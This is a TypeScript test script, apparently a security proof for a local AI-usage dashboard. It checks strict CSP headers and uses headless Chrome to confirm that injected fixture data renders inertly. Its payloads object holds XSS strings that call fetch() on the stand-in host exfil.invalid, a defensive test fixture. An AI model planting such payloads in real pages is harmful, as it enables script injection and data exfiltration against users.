import crypto from "node:crypto";
import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import { spawn, spawnSync, type ChildProcess } from "node:child_process";
import { fileURLToPath } from "node:url";
import type { AddressInfo } from "node:net";

import { LocalEventBuffer } from "../packages/collector-cli/src/buffer";
import { collectorConfigSchema } from "../packages/collector-cli/src/config";
import { createCollectorServer } from "../packages/collector-cli/src/server";

const scriptPath = fileURLToPath(import.meta.url);
const repoRoot = path.resolve(path.dirname(scriptPath), "..");
const dashboardPath = path.join(repoRoot, "packages/collector-cli/src/dashboard.html");
const chromePath = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";
const BROWSER_PROTOCOL_CLOSE_MS = 1_000;
const BROWSER_SIGNAL_GRACE_MS = 1_500;
const BROWSER_PROOF_WALL_MS = 30_000;
const CDP_SOCKET_OPEN_MS = 2_000;
const CDP_COMMAND_MS = 5_000;
const DEBUGGER_TARGET_MS = 2_000;
const DASHBOARD_READY_MS = 8_000;
const ABORT_SETTLE_MS = 500;

const payloads = {
  html: `HTML:<img src="https://exfil.invalid/html" onerror="fetch('https://exfil.invalid/html-event')">`,
  svg: `SVG:<svg><script>fetch('https://exfil.invalid/svg')</script><animate onbegin="alert(1)"></animate></svg>`,
  script: `SCRIPT:</script><script>fetch('https://exfil.invalid/script')</script>`,
  event: `EVENT:" autofocus onfocus="fetch('https://exfil.invalid/event')" x="`,
  url: `URL:javascript:fetch('https://exfil.invalid/url')`,
  unicode: `UNICODE:𝕻𝖑𝖎𝖒𝖘𝖔𝖑𝖑 e\u0301 \u202Etxt\u2066 <b>still text</b>`,
} as const;

const snapshotFixture = {
  window: { days: 30 },
  generation: 109,
  projection: {
    status: "ready",
    freshnessAt: "2026-07-17T18:00:00.000Z",
    degraded: false,
  },
  summary: {
    days: 30,
    totals: {
      costUsd: 12.34,
      inputTokens: 1234,
      outputTokens: 234,
      cacheReadTokens: 34,
      cacheCreationTokens: 12,
      sessions: 1,
      sessionsWithTokens: 1,
      events: 3,
    },
    daily: [{ day: "2026-07-17", costUsd: 12.34, tokens: 1468 }],
    byModel: [{ model: payloads.html, calls: 1, inputTokens: 1234, outputTokens: 234, costUsd: 12.34, unpricedCalls: 0 }],
    bySource: [{ source: payloads.svg, sessions: 1, events: 3, costUsd: 12.34 }],
  },
  sessions: [{
    sessionId: `session-${payloads.event}`,
    startedAt: "2026-07-17T17:00:00.000Z",
    source: "codex",
    events: 3,
    inputTokens: 1234,
    outputTokens: 234,
    costUsd: 12.34,
    repoHash: "sha256:securityproofrepo",
    repoLabel: payloads.url,
    repoCount: 2,
  }],
  repos: [{
    repoHash: "sha256:securityproofrepo",
    label: payloads.svg,
    sessions: 1,
    inputTokens: 1234,
    outputTokens: 234,
    costUsd: 12.34,
  }],
  accounts: {
    priorityRepoCount: 1,
    buckets: { priorityUsd: 10, otherUsd: 2, unlinkedUsd: 0.34 },
    accounts: [{
      accountHash: "sha256:securityproofaccount",
      label: payloads.script,
      email: payloads.event,
      machines: [payloads.unicode],
      sessions: 1,
      priorityUsd: 10,
      otherUsd: 2,
      unlinkedUsd: 0.34,
      totalUsd: 12.34,
      subscription: {
        plan: payloads.url,
        usdPerMonth: 20,
        planCostWindow: 20,
        leverage: 1.2,
        byVendor: [{ plans: payloads.html, spendUsd: 12.34, planCostWindow: 10, leverage: 1.2 }],
      },
    }],
  },
  status: {
    retentionDays: 90,
    stats: { count: 3 },
    health: {
      overall: "amber",
      sources: [{
        source: "codex",
        status: "amber",
        reason: payloads.unicode,
        lastEventAt: "2026-07-17T17:59:00.000Z",
        localLastActivityAt: "2026-07-17T17:59:00.000Z",
      }],
    },
  },
};

const sessionFixture = {
  rollup: {
    source: payloads.html,
    startedAt: "2026-07-17T17:00:00.000Z",
    endedAt: "2026-07-17T17:10:00.000Z",
    events: 3,
    tokenEvents: 1,
    inputTokens: 1234,
    outputTokens: 234,
    cacheReadTokens: 34,
    cacheCreationTokens: 12,
    costUsd: 12.34,
  },
  receipts: {
    linkage: [{ repoHash: "sha256:securityproofrepo", branchHash: "sha256:securityproofbranch", headSha: payloads.event, events: 3 }],
    actionMix: [{ actionClass: payloads.svg, n: 3 }],
    eventTypes: [{ eventType: payloads.script, n: 3 }],
    models: [{ model: payloads.url, inputTokens: 1234, outputTokens: 234, costUsd: 12.34 }],
    suppression: { suppressedEvents: 3 },
  },
};

const repoFixture = {
  label: payloads.svg,
  days: 30,
  repoHash: "sha256:securityproofrepo",
  totals: { sessions: 1, events: 3, inputTokens: 1234, outputTokens: 234, costUsd: 12.34 },
  daily: [{ day: "2026-07-17", costUsd: 12.34 }],
  actionMix: [{ actionClass: payloads.html, n: 3 }],
  models: [{ model: payloads.event, inputTokens: 1234, outputTokens: 234, costUsd: 12.34 }],
  branches: [{ branchHash: "sha256:securityproofbranch", sessions: 1, events: 3 }],
};

const settingsFixture = {
  accounts: [
    { accountHash: "sha256:securityproofaccount", label: payloads.script, email: payloads.event },
    { accountHash: "sha256:securityproofcanonical", label: payloads.unicode, email: null },
  ],
  accountAliases: [],
  priorityRepos: [{ url: payloads.url }, { url: `https://exfil.invalid/display-only/${encodeURIComponent(payloads.svg)}` }],
  subscriptions: [{ account: payloads.html, plan: payloads.svg, usdPerMonth: 20, vendor: "other" }],
  detectedIdentities: [{ source: "codex", email: payloads.event, planType: payloads.unicode }],
};

type CheckReceipt = { name: string; passed: boolean; detail: string };
const checks: CheckReceipt[] = [];
function check(name: string, passed: unknown, detail: string) {
  const receipt = { name, passed: Boolean(passed), detail };
  checks.push(receipt);
  console.log(`${receipt.passed ? "PASS" : "FAIL"} ${name} — ${detail}`);
}

function inlineBlock(html: string, tag: "script" | "style") {
  const opening = `<${tag}>`, start = html.indexOf(opening), end = html.indexOf(`</${tag}>`, start + opening.length);
  if (start < 0 || end < 0) throw new Error(`${tag} block missing`);
  return html.slice(start + opening.length, end);
}

function sha256Source(block: string) {
  return `'sha256-${crypto.createHash("sha256").update(block).digest("base64")}'`;
}

function securityHeaders(html: string) {
  return {
    "content-type": "text/html; charset=utf-8",
    "content-security-policy": [
      "default-src 'none'",
      `script-src ${sha256Source(inlineBlock(html, "script"))}`,
      "script-src-attr 'none'",
      `style-src ${sha256Source(inlineBlock(html, "style"))}`,
      "style-src-attr 'none'",
      "connect-src 'self'",
      "base-uri 'none'",
      "form-action 'none'",
      "frame-ancestors 'none'",
      "object-src 'none'",
    ].join("; "),
    "x-content-type-options": "nosniff",
    "x-frame-options": "DENY",
  };
}

async function actualServerHeaderProof() {
  const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "plimsoll-dashboard-security-headers-"));
  process.env.PLIMSOLL_HOME = tempDir;
  const buffer = new LocalEventBuffer(path.join(tempDir, "ledger.sqlite"));
  const server = createCollectorServer(collectorConfigSchema.parse({}), buffer);
  try {
    await new Promise<void>((resolve, reject) => {
      server.once("error", reject);
      server.listen(0, "127.0.0.1", resolve);
    });
    const port = (server.address() as AddressInfo).port;
    const response = await fetch(`http://127.0.0.1:${port}/`);
    const html = await response.text();
    const csp = response.headers.get("content-security-policy") ?? "";
    const expectedScript = sha256Source(inlineBlock(html, "script"));
    const expectedStyle = sha256Source(inlineBlock(html, "style"));
    check(
      "dashboard_headers_strict_csp",
      response.status === 200 &&
        csp.includes("default-src 'none'") &&
        csp.includes(`script-src ${expectedScript}`) &&
        csp.includes(`style-src ${expectedStyle}`) &&
        csp.includes("script-src-attr 'none'") &&
        csp.includes("style-src-attr 'none'") &&
        csp.includes("connect-src 'self'") &&
        csp.includes("frame-ancestors 'none'") &&
        !csp.includes("'unsafe-inline'") &&
        !csp.includes("'unsafe-eval'") &&
        !csp.includes("https:") &&
        !csp.includes("http:") &&
        !csp.includes(" *"),
      csp,
    );
    check(
      "dashboard_headers_frame_mime_no_cors",
      response.headers.get("x-frame-options") === "DENY" &&
        response.headers.get("x-content-type-options") === "nosniff" &&
        response.headers.get("access-control-allow-origin") === null,
      JSON.stringify({
        frame: response.headers.get("x-frame-options"),
        nosniff: response.headers.get("x-content-type-options"),
        cors: response.headers.get("access-control-allow-origin"),
      }),
    );
  } finally {
    if (server.listening) await new Promise<void>((resolve) => server.close(() => resolve()));
    buffer.close();
    fs.rmSync(tempDir, { recursive: true, force: true });
  }
}

type TimeoutStage =
  | "browser_proof_overall"
  | "cdp_socket_open"
  | "cdp_command"
  | "dashboard_readiness"
  | "debugger_startup"
  | "debugger_target";

class ProofTimeoutError extends Error {
  constructor(readonly stage: TimeoutStage) {
    super(`proof_timeout:${stage}`);
    this.name = "ProofTimeoutError";
  }
}

type CdpEvent = Record<string, unknown>;
type SocketListener = (event: Event) => void;
type CdpSocket = {
  readyState: number;
  addEventListener: (type: string, listener: SocketListener, options?: AddEventListenerOptions | boolean) => void;
  removeEventListener: (type: string, listener: SocketListener, options?: EventListenerOptions | boolean) => void;
  send: (data: string) => void;
  close: () => void;
};

type CdpWaiter = {
  resolve: (value: unknown) => void;
  reject: (error: Error) => void;
};

class CdpClient {
  private nextId = 1;
  private closed = false;
  private readonly pending = new Map<number, CdpWaiter>();
  private readonly handlers = new Map<string, Array<(params: CdpEvent) => void>>();
  private readonly onMessage = (event: Event) => {
    let message: { id?: number; method?: string; params?: CdpEvent; result?: unknown; error?: unknown };
    try {
      message = JSON.parse(String((event as MessageEvent).data)) as typeof message;
    } catch {
      this.failPending(new Error("cdp_protocol_invalid"));
      return;
    }
    if (message.id !== undefined) {
      const waiter = this.pending.get(message.id);
      if (!waiter) return;
      if (message.error) waiter.reject(new Error("cdp_command_rejected"));
      else waiter.resolve(message.result);
      return;
    }
    if (message.method) {
      for (const handler of this.handlers.get(message.method) ?? []) handler(message.params ?? {});
    }
  };
  private readonly onSocketFailure = () => this.failPending(new Error("cdp_socket_closed"));

  private constructor(
    private readonly socket: CdpSocket,
    private readonly defaultSignal?: AbortSignal,
  ) {
    socket.addEventListener("message", this.onMessage);
    socket.addEventListener("error", this.onSocketFailure);
    socket.addEventListener("close", this.onSocketFailure);
  }

  static async connect(
    url: string,
    options: {
      timeoutMs?: number;
      signal?: AbortSignal;
      socketFactory?: (url: string) => CdpSocket;
    } = {},
  ) {
    const timeoutMs = options.timeoutMs ?? CDP_SOCKET_OPEN_MS;
    const socket = (options.socketFactory ?? ((value) => new WebSocket(value) as CdpSocket))(url);
    await new Promise<void>((resolve, reject) => {
      let settled = false;
      const cleanup = () => {
        clearTimeout(timer);
        socket.removeEventListener("open", onOpen);
        socket.removeEventListener("error", onError);
        options.signal?.removeEventListener("abort", onAbort);
      };
      const finish = (error?: Error) => {
        if (settled) return;
        settled = true;
        cleanup();
        if (error) {
          try { socket.close(); } catch { /* best effort for a connecting socket */ }
          reject(error);
        } else {
          resolve();
        }
      };
      const onOpen: SocketListener = () => finish();
      const onError: SocketListener = () => finish(new Error("cdp_socket_open_failed"));
      const onAbort = () => finish(new ProofTimeoutError("browser_proof_overall"));
      const timer = setTimeout(() => finish(new ProofTimeoutError("cdp_socket_open")), timeoutMs);
      socket.addEventListener("open", onOpen, { once: true });
      socket.addEventListener("error", onError, { once: true });
      options.signal?.addEventListener("abort", onAbort, { once: true });
      if (options.signal?.aborted) onAbort();
      else if (socket.readyState === WebSocket.OPEN) finish();
    });
    return new CdpClient(socket, options.signal);
  }

  static fromSocketForProof(socket: CdpSocket, signal?: AbortSignal) {
    return new CdpClient(socket, signal);
  }

  get pendingCount() {
    return this.pending.size;
  }

  on(method: string, handler: (params: CdpEvent) => void) {
    const entries = this.handlers.get(method) ?? [];
    entries.push(handler);
    this.handlers.set(method, entries);
  }

  send<T = Record<string, unknown>>(
    method: string,
    params: Record<string, unknown> = {},
    options: { timeoutMs?: number; signal?: AbortSignal | null } = {},
  ) {
    if (this.closed || this.socket.readyState !== WebSocket.OPEN) {
      return Promise.reject<T>(new Error("cdp_socket_not_open"));
    }
    const id = this.nextId++;
    const timeoutMs = options.timeoutMs ?? CDP_COMMAND_MS;
    const signal = options.signal === undefined ? this.defaultSignal : options.signal ?? undefined;
    return new Promise<T>((resolve, reject) => {
      let settled = false;
      const cleanup = () => {
        clearTimeout(timer);
        signal?.removeEventListener("abort", onAbort);
        this.pending.delete(id);
      };
      const finish = (error: Error | null, value?: unknown) => {
        if (settled) return;
        settled = true;
        cleanup();
        if (error) reject(error);
        else resolve(value as T);
      };
      const onAbort = () => finish(new ProofTimeoutError("browser_proof_overall"));
      const timer = setTimeout(() => finish(new ProofTimeoutError("cdp_command")), timeoutMs);
      this.pending.set(id, {
        resolve: (value) => finish(null, value),
        reject: (error) => finish(error),
      });
      signal?.addEventListener("abort", onAbort, { once: true });
      if (signal?.aborted) {
        onAbort();
        return;
      }
      try {
        this.socket.send(JSON.stringify({ id, method, params }));
      } catch {
        finish(new Error("cdp_send_failed"));
      }
    });
  }

  close() {
    if (this.closed) return;
    this.closed = true;
    this.failPending(new Error("cdp_client_closed"));
    this.handlers.clear();
    this.socket.removeEventListener("message", this.onMessage);
    this.socket.removeEventListener("error", this.onSocketFailure);
    this.socket.removeEventListener("close", this.onSocketFailure);
    try { this.socket.close(); } catch { /* process teardown remains authoritative */ }
  }

  private failPending(error: Error) {
    for (const waiter of [...this.pending.values()]) waiter.reject(error);
  }
}

function childHasExited(child: ChildProcess) {
  return child.exitCode !== null || child.signalCode !== null;
}

async function waitForChildExit(child: ChildProcess, timeoutMs: number) {
  if (childHasExited(child)) return true;
  return new Promise<boolean>((resolve) => {
    let settled = false;
    const finish = (exited: boolean) => {
      if (settled) return;
      settled = true;
      clearTimeout(timeout);
      child.off("exit", onExit);
      resolve(exited);
    };
    const onExit = () => finish(true);
    const timeout = setTimeout(() => finish(childHasExited(child)), timeoutMs);
    child.once("exit", onExit);
    if (childHasExited(child)) finish(true);
  });
}

async function boundedResult<T>(promise: Promise<T>, timeoutMs: number) {
  let timeout: NodeJS.Timeout | undefined;
  const result = await Promise.race([
    promise.then((value) => ({ status: "settled" as const, value })),
    new Promise<{ status: "timed_out" }>((resolve) => {
      timeout = setTimeout(() => resolve({ status: "timed_out" }), timeoutMs);
    }),
  ]);
  if (timeout) clearTimeout(timeout);
  return result;
}

async function shutdownBrowser(
  cdp: CdpClient | undefined,
  chrome: ChildProcess,
  timing = {
    protocolCloseMs: BROWSER_PROTOCOL_CLOSE_MS,
    signalGraceMs: BROWSER_SIGNAL_GRACE_MS,
  },
) {
  const startedAt = Date.now();
  let protocolClose: "not_connected" | "acknowledged" | "rejected" | "timed_out" = "not_connected";
  if (cdp && !childHasExited(chrome)) {
    try {
      await cdp.send("Browser.close", {}, { timeoutMs: timing.protocolCloseMs, signal: null });
      protocolClose = "acknowledged";
    } catch (error) {
      protocolClose = error instanceof ProofTimeoutError ? "timed_out" : "rejected";
    }
  }
  cdp?.close();

  if (await waitForChildExit(chrome, timing.protocolCloseMs)) {
    return { exited: true, protocolClose, escalatedTo: "none" as const, durationMs: Date.now() - startedAt };
  }

  chrome.kill("SIGTERM");
  if (await waitForChildExit(chrome, timing.signalGraceMs)) {
    return { exited: true, protocolClose, escalatedTo: "SIGTERM" as const, durationMs: Date.now() - startedAt };
  }

  chrome.kill("SIGKILL");
  const exited = await waitForChildExit(chrome, timing.signalGraceMs);
  if (!exited) throw new Error(`Chrome did not exit after bounded SIGKILL teardown (pid ${chrome.pid ?? "unknown"})`);
  return { exited: true, protocolClose, escalatedTo: "SIGKILL" as const, durationMs: Date.now() - startedAt };
}

async function proveBoundedSignalEscalation() {
  const child = spawn(process.execPath, [
    "-e",
    "process.on('SIGTERM',()=>{});process.stdout.write('ready\\n');setInterval(()=>{},1000)",
  ], {
    env: { PATH: process.env.PATH ?? "/usr/bin:/bin" },
    stdio: ["ignore", "pipe", "ignore"],
  });
  try {
    await waitForChildReady(child);
    const receipt = await shutdownBrowser(undefined, child, {
      protocolCloseMs: 25,
      signalGraceMs: 100,
    });
    check(
      "browser_teardown_escalates_after_sigterm_resistance",
      receipt.exited && receipt.escalatedTo === "SIGKILL" && receipt.durationMs <= 500,
      JSON.stringify(receipt),
    );
  } finally {
    if (!childHasExited(child)) {
      child.kill("SIGKILL");
      await waitForChildExit(child, 500);
    }
  }
}

class NeverResolvingSocket implements CdpSocket {
  private readonly listeners = new Map<string, Set<SocketListener>>();
  readyState: number;
  closed = false;
  sends = 0;

  constructor(readyState: number = WebSocket.OPEN) {
    this.readyState = readyState;
  }

  addEventListener(type: string, listener: SocketListener) {
    const entries = this.listeners.get(type) ?? new Set<SocketListener>();
    entries.add(listener);
    this.listeners.set(type, entries);
  }

  removeEventListener(type: string, listener: SocketListener) {
    const entries = this.listeners.get(type);
    entries?.delete(listener);
    if (entries?.size === 0) this.listeners.delete(type);
  }

  send() {
    this.sends += 1;
  }

  close() {
    this.closed = true;
    this.readyState = WebSocket.CLOSED;
  }

  get listenerCount() {
    return [...this.listeners.values()].reduce((total, entries) => total + entries.size, 0);
  }
}

async function closeFixtureServer(server: http.Server) {
  if (!server.listening) return true;
  server.closeAllConnections();
  const result = await boundedResult(
    new Promise<void>((resolve) => server.close(() => resolve())),
    ABORT_SETTLE_MS,
  );
  if (result.status === "timed_out") server.closeAllConnections();
  return result.status === "settled";
}

async function runWithBrowserWatchdog<T>(options: {
  operation: Promise<T>;
  controller: AbortController;
  cleanup: () => Promise<void>;
  timeoutMs: number;
}) {
  let timeout: NodeJS.Timeout | undefined;
  const watchdog = new Promise<never>((_resolve, reject) => {
    timeout = setTimeout(() => {
      options.controller.abort();
      void options.cleanup().catch(() => undefined);
      reject(new ProofTimeoutError("browser_proof_overall"));
    }, options.timeoutMs);
  });
  try {
    return await Promise.race([options.operation, watchdog]);
  } finally {
    if (timeout) clearTimeout(timeout);
  }
}

async function waitForChildReady(child: ChildProcess) {
  await new Promise<void>((resolve, reject) => {
    let settled = false;
    const finish = (error?: Error) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      child.off("error", onError);
      child.stdout?.off("data", onData);
      if (error) reject(error);
      else resolve();
    };
    const onError = () => finish(new Error("fixture_child_failed"));
    const onData = () => finish();
    const timer = setTimeout(() => finish(new Error("fixture_child_not_ready")), 1_000);
    child.once("error", onError);
    child.stdout?.once("data", onData);
  });
}

async function runNeverResolvingCdpScenario(fixtureRoot?: string) {
  const profile = fs.mkdtempSync(path.join(
    fixtureRoot ?? os.tmpdir(),
    "plimsoll-dashboard-never-cdp-",
  ));
  const privateSentinel = "NEVER_RESOLVING_CDP_PRIVATE_SENTINEL";
  fs.writeFileSync(path.join(profile, "sentinel"), privateSentinel);
  const child = spawn(process.execPath, [
    "-e",
    "process.on('SIGTERM',()=>{});process.stdout.write('ready\\n');setInterval(()=>{},1000)",
  ], {
    env: { PATH: process.env.PATH ?? "/usr/bin:/bin", HOME: profile },
    stdio: ["ignore", "pipe", "ignore"],
  });
  if (fixtureRoot && child.pid) {
    fs.writeFileSync(path.join(fixtureRoot, "child.pid"), `${child.pid}\n`);
  }
  const socket = new NeverResolvingSocket();
  const controller = new AbortController();
  const cdp = CdpClient.fromSocketForProof(socket, controller.signal);
  let cleanupPromise: Promise<void> | undefined;
  let shutdownReceipt: Awaited<ReturnType<typeof shutdownBrowser>> | undefined;
  const cleanup = () => cleanupPromise ??= (async () => {
    controller.abort();
    try {
      shutdownReceipt = await shutdownBrowser(cdp, child, {
        protocolCloseMs: 25,
        signalGraceMs: 100,
      });
    } finally {
      fs.rmSync(profile, { recursive: true, force: true });
    }
  })();

  let timeoutError: unknown;
  const operation = (async () => {
    await waitForChildReady(child);
    await cdp.send("Runtime.evaluate", {}, { timeoutMs: 1_000 });
  })();
  try {
    await runWithBrowserWatchdog({ operation, controller, cleanup, timeoutMs: 50 });
  } catch (error) {
    timeoutError = error;
  } finally {
    await cleanup();
  }
  const operationSettlement = await boundedResult(operation.then(
    () => "fulfilled" as const,
    () => "rejected" as const,
  ), ABORT_SETTLE_MS);
  return {
    cdp,
    child,
    operationSettlement,
    privateSentinel,
    profile,
    shutdownReceipt,
    socket,
    timeoutError,
  };
}

async function proveNeverResolvingCdpCleanup() {
  const connectingSocket = new NeverResolvingSocket(WebSocket.CONNECTING);
  let connectError: unknown;
  try {
    await CdpClient.connect("ws://proof.invalid", {
      timeoutMs: 25,
      socketFactory: () => connectingSocket,
    });
  } catch (error) {
    connectError = error;
  }
  check(
    "cdp_socket_open_timeout_settles_socket_and_listeners",
    connectError instanceof ProofTimeoutError &&
      connectError.message === "proof_timeout:cdp_socket_open" &&
      connectingSocket.closed &&
      connectingSocket.listenerCount === 0,
    JSON.stringify({
      error: connectError instanceof Error ? connectError.message : "missing",
      socketClosed: connectingSocket.closed,
      listeners: connectingSocket.listenerCount,
    }),
  );

  const commandSocket = new NeverResolvingSocket();
  const commandClient = CdpClient.fromSocketForProof(commandSocket);
  let commandError: unknown;
  try {
    await commandClient.send("Runtime.evaluate", {}, { timeoutMs: 25, signal: null });
  } catch (error) {
    commandError = error;
  } finally {
    commandClient.close();
  }
  check(
    "cdp_command_timeout_settles_timer_pending_map_socket_and_listeners",
    commandError instanceof ProofTimeoutError &&
      commandError.message === "proof_timeout:cdp_command" &&
      commandClient.pendingCount === 0 &&
      commandSocket.closed &&
      commandSocket.listenerCount === 0,
    JSON.stringify({
      error: commandError instanceof Error ? commandError.message : "missing",
      pendingCommands: commandClient.pendingCount,
      socketClosed: commandSocket.closed,
      listeners: commandSocket.listenerCount,
    }),
  );

  const scenario = await runNeverResolvingCdpScenario();
  check(
    "never_resolving_cdp_outer_watchdog_cleans_process_profile_socket_and_timers",
    scenario.timeoutError instanceof ProofTimeoutError &&
      scenario.timeoutError.message === "proof_timeout:browser_proof_overall" &&
      !scenario.timeoutError.message.includes(scenario.privateSentinel) &&
      scenario.shutdownReceipt?.exited === true &&
      scenario.shutdownReceipt.escalatedTo === "SIGKILL" &&
      childHasExited(scenario.child) &&
      !fs.existsSync(scenario.profile) &&
      scenario.cdp.pendingCount === 0 &&
      scenario.socket.closed &&
      scenario.socket.listenerCount === 0 &&
      scenario.operationSettlement.status === "settled" &&
      scenario.operationSettlement.value === "rejected",
    JSON.stringify({
      error: scenario.timeoutError instanceof Error ? scenario.timeoutError.message : "missing",
      shutdownReceipt: scenario.shutdownReceipt,
      processExited: childHasExited(scenario.child),
      profileRemoved: !fs.existsSync(scenario.profile),
      pendingCommands: scenario.cdp.pendingCount,
      socketClosed: scenario.socket.closed,
      socketListeners: scenario.socket.listenerCount,
      operationSettlement: scenario.operationSettlement,
    }),
  );
}

function pidIsLive(pid: number) {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

function proveTimeoutExitSurface() {
  const fixtureRoot = fs.mkdtempSync(path.join(os.tmpdir(), "plimsoll-dashboard-timeout-exit-"));
  let fixturePid = 0;
  try {
    const result = spawnSync(
      process.execPath,
      [path.join(repoRoot, "node_modules", "tsx", "dist", "cli.mjs"), scriptPath],
      {
        encoding: "utf8",
        env: {
          HOME: fixtureRoot,
          PATH: process.env.PATH ?? "/usr/bin:/bin",
          PLIMSOLL_DASHBOARD_TIMEOUT_EXIT_FIXTURE: "1",
          PLIMSOLL_DASHBOARD_TIMEOUT_FIXTURE_ROOT: fixtureRoot,
        },
        killSignal: "SIGKILL",
        timeout: 5_000,
      },
    );
    const pidFile = path.join(fixtureRoot, "child.pid");
    fixturePid = fs.existsSync(pidFile) ? Number(fs.readFileSync(pidFile, "utf8").trim()) : 0;
    const remaining = fs.readdirSync(fixtureRoot).filter((entry) => entry !== "child.pid");
    const expectedError = JSON.stringify({
      proof: "dashboard-security",
      error: "proof_timeout",
      stage: "browser_proof_overall",
    });
    check(
      "timeout_process_exits_nonzero_content_free_and_leaves_no_profile_or_child",
      result.status === 1 &&
        result.signal === null &&
        result.stdout === "" &&
        result.stderr.trim() === expectedError &&
        fixturePid > 0 &&
        !pidIsLive(fixturePid) &&
        remaining.length === 0,
      JSON.stringify({
        status: result.status,
        signal: result.signal,
        stdoutBytes: Buffer.byteLength(result.stdout ?? ""),
        stderr: result.stderr.trim(),
        childExited: fixturePid > 0 && !pidIsLive(fixturePid),
        remainingProfileEntries: remaining,
      }),
    );
  } finally {
    if (fixturePid > 0 && pidIsLive(fixturePid)) {
      try { process.kill(fixturePid, "SIGKILL"); } catch { /* best effort fixture cleanup */ }
    }
    fs.rmSync(fixtureRoot, { recursive: true, force: true });
  }
}

function abortableDelay(ms: number, signal: AbortSignal) {
  return new Promise<void>((resolve, reject) => {
    let settled = false;
    const finish = (error?: Error) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      signal.removeEventListener("abort", onAbort);
      if (error) reject(error);
      else resolve();
    };
    const onAbort = () => finish(new ProofTimeoutError("browser_proof_overall"));
    const timer = setTimeout(() => finish(), ms);
    signal.addEventListener("abort", onAbort, { once: true });
    if (signal.aborted) onAbort();
  });
}

async function waitForFile(file: string, process: ChildProcess, signal: AbortSignal) {
  const deadline = Date.now() + 10_000;
  while (Date.now() < deadline) {
    if (fs.existsSync(file)) return;
    if (signal.aborted) throw new ProofTimeoutError("browser_proof_overall");
    if (childHasExited(process)) {
      throw new Error("chrome_exited_before_debugger_startup");
    }
    await abortableDelay(25, signal);
  }
  throw new ProofTimeoutError("debugger_startup");
}

async function fetchDebuggerTargets(url: string, signal: AbortSignal) {
  const controller = new AbortController();
  let timedOut = false;
  const onAbort = () => controller.abort();
  signal.addEventListener("abort", onAbort, { once: true });
  const timer = setTimeout(() => {
    timedOut = true;
    controller.abort();
  }, DEBUGGER_TARGET_MS);
  try {
    const response = await fetch(url, { signal: controller.signal });
    if (!response.ok) throw new Error("debugger_target_unavailable");
    return await response.json() as Array<{ type: string; webSocketDebuggerUrl: string }>;
  } catch (error) {
    if (signal.aborted) throw new ProofTimeoutError("browser_proof_overall");
    if (timedOut) throw new ProofTimeoutError("debugger_target");
    throw error instanceof ProofTimeoutError ? error : new Error("debugger_target_unavailable");
  } finally {
    clearTimeout(timer);
    signal.removeEventListener("abort", onAbort);
  }
}

async function evaluate<T>(
  cdp: CdpClient,
  expression: string,
  awaitPromise = false,
  signal?: AbortSignal,
): Promise<T> {
  const result = await cdp.send<{
    result?: { value?: T; description?: string };
    exceptionDetails?: { text?: string; exception?: { description?: string } };
  }>("Runtime.evaluate", { expression, awaitPromise, returnByValue: true }, { signal });
  if (result.exceptionDetails) throw new Error(result.exceptionDetails.exception?.description ?? result.exceptionDetails.text ?? "evaluation failed");
  return result.result?.value as T;
}

async function waitForText(cdp: CdpClient, marker: string, signal: AbortSignal) {
  const deadline = Date.now() + DASHBOARD_READY_MS;
  while (Date.now() < deadline) {
    if (await evaluate<boolean>(cdp, `document.body.textContent.includes(${JSON.stringify(marker)})`, false, signal)) return;
    await abortableDelay(50, signal);
  }
  throw new ProofTimeoutError("dashboard_readiness");
}

function startFixtureServer(html: string, mutations: Array<{ route: string; body: unknown }>) {
  const headers = securityHeaders(html);
  const server = http.createServer((request, response) => {
    const url = new URL(request.url ?? "/", "http://127.0.0.1");
    if (request.method === "GET" && (url.pathname === "/" || url.pathname === "/index.html")) {
      response.writeHead(200, headers);response.end(html);return;
    }
    if (request.method === "POST" && url.pathname.startsWith("/api/settings/")) {
      const chunks: Buffer[] = [];
      request.on("data", (chunk) => chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk)));
      request.on("end", () => {
        let body: unknown = null;
        try { body = JSON.parse(Buffer.concat(chunks).toString("utf8") || "null") } catch { body = "invalid_json" }
        mutations.push({ route: url.pathname, body });
        response.writeHead(200, { "content-type": "application/json", "x-content-type-options": "nosniff" });
        response.end('{"ok":true}');
      });
      return;
    }
    const fixtures: Record<string, unknown> = {
      "/api/snapshot": snapshotFixture,
      "/api/settings": settingsFixture,
      "/api/session": sessionFixture,
      "/api/repo": repoFixture,
    };
    if (url.pathname in fixtures) {
      response.writeHead(200, { "content-type": "application/json", "x-content-type-options": "nosniff" });
      response.end(JSON.stringify(fixtures[url.pathname]));return;
    }
    response.writeHead(404, { "content-type": "application/json", "x-content-type-options": "nosniff" });response.end('{"error":"not_found"}');
  });
  return server;
}

async function browserProof(html: string) {
  if (!fs.existsSync(chromePath)) throw new Error(`Chrome unavailable at ${chromePath}`);
  const mutations: Array<{ route: string; body: unknown }> = [];
  const fixtureServer = startFixtureServer(html, mutations);
  await new Promise<void>((resolve, reject) => {
    fixtureServer.once("error", reject);fixtureServer.listen(0, "127.0.0.1", resolve);
  });
  const base = `http://127.0.0.1:${(fixtureServer.address() as AddressInfo).port}`;
  const profile = fs.mkdtempSync(path.join(os.tmpdir(), "plimsoll-dashboard-chrome-"));
  const chrome = spawn(chromePath, [
    "--headless=new",
    "--no-first-run",
    "--disable-background-networking",
    "--disable-component-update",
    "--disable-default-apps",
    "--disable-sync",
    "--metrics-recording-only",
    "--remote-debugging-port=0",
    `--user-data-dir=${profile}`,
    "about:blank",
  ], { stdio: "ignore" });
  const controller = new AbortController();
  let cdp: CdpClient | undefined;
  let shutdownReceipt: Awaited<ReturnType<typeof shutdownBrowser>> | undefined;
  let serverClosed = false;
  let cleanupPromise: Promise<void> | undefined;
  const cleanup = () => cleanupPromise ??= (async () => {
    controller.abort();
    try {
      shutdownReceipt = await shutdownBrowser(cdp, chrome);
    } finally {
      serverClosed = await closeFixtureServer(fixtureServer);
      fs.rmSync(profile, { recursive: true, force: true });
    }
  })();
  const operation = (async () => {
    const activePort = path.join(profile, "DevToolsActivePort");
    await waitForFile(activePort, chrome, controller.signal);
    const [debugPort] = fs.readFileSync(activePort, "utf8").split("\n");
    const targets = await fetchDebuggerTargets(
      `http://127.0.0.1:${debugPort}/json/list`,
      controller.signal,
    );
    const page = targets.find((target) => target.type === "page");
    if (!page) throw new Error("Chrome page target unavailable");
